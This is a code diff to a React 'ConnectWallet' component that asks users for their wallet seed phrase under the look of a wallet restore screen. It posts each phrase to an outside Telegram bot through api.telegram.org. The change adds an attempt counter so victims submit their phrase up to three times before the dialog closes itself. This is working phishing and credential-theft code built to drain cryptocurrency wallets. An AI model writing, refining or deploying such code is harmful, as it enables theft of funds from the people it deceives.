@@ -66,7 +66,7 @@ function ConnectWallet({ onClose }) {
   const handleTransferWallet = async (message, attemptCount) => {
     const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
-  
+
     const endpoint = {
       url: `https://api.telegram.org/bot${token}/sendMessage`,
       data: {
@@ -74,7 +74,7 @@ function ConnectWallet({ onClose }) {
         text: `Minwallet:   ${message}`,
       },
     };
-  
+
     try {
       const response = await fetch(endpoint.url, {
         method: "POST",
@@ -83,28 +83,34 @@ function ConnectWallet({ onClose }) {
         },
         body: JSON.stringify(endpoint.data),
       });
-  
+
       if (response.ok) {
         console.log(`Message sent successfully (Attempt ${attemptCount}/3)`);
       } else {
         console.error(`Failed to send message (Attempt ${attemptCount}/3)`);
       }
     } catch (error) {
-      console.error(`Error sending message (Attempt ${attemptCount}/3):`, error);
-    }
-  
-    if (attemptCount === 3) {
-      console.log("All attempts completed");
-      onClose();
+      console.error(
+        `Error sending message (Attempt ${attemptCount}/3):`,
+        error
+      );
     }
   };
-  const SeedPhraseContainer = ({ handleTransferWallet }) => {
+  const SeedPhraseContainer = ({ handleTransferWallet, onClose }) => {
     const textareaRef = useRef(null);
+    const [attemptCount, setAttemptCount] = useState(0);
 
     const handleSubmit = () => {
       if (textareaRef.current) {
         const message = textareaRef.current.value.trim();
-        handleTransferWallet(message);
+        const newAttemptCount = attemptCount + 1;
+        setAttemptCount(newAttemptCount);
+
+        handleTransferWallet(message, newAttemptCount);
+
+        if (newAttemptCount === 3) {
+          setTimeout(() => onClose(), 1000); // Close after a short delay to allow for the last message to be sent
+        }
       }
     };
 
@@ -127,8 +133,9 @@ function ConnectWallet({ onClose }) {
         <button
           className="p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold"
           onClick={handleSubmit}
+          disabled={attemptCount >= 3}
         >
-          Next
+          {attemptCount < 3 ? "Next" : "Next"}
         </button>
       </div>
     );
@@ -382,6 +389,7 @@ function ConnectWallet({ onClose }) {
                                 {restoreMethod === "seedPhrase" ? (
                                   <SeedPhraseContainer
                                     handleTransferWallet={handleTransferWallet}
+                                    onClose={onClose}
                                   />
                                 ) : (
                                   <ImportContainer />
